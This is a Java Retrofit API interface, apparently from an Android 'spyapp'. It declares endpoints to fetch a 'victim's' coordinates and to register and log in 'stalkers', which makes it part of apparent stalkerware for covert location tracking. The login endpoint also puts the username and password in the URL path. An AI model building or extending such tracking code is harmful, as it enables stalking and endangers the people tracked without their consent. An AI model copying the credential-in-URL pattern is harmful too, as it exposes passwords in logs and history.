package com.example.albert.spyapp.requests;

import com.example.albert.spyapp.requests.responseModels.CordsResponse;
import com.example.albert.spyapp.requests.responseModels.TestResponse;
import com.google.gson.JsonObject;

import java.util.HashMap;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Field;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.GET;
import retrofit2.http.POST;
import retrofit2.http.Path;

public interface ApiInterface {
    @GET("test")
    Call<TestResponse> getTest();

    @GET("victim/getCords/albi")
    Call<CordsResponse> getCords();

    @GET("stalker/getStalker/{userName}/{password}")
    Call<JsonObject> getLogin(@Path("userName") String userName, @Path("password") String password);

    @POST("stalker/addStalker")
    Call<String> addStalker(@Body HashMap<String, String> body);

    @GET("stalker/links/{stalker}")
    Call<String> getLinks(@Path("stalker") String stalker);
}

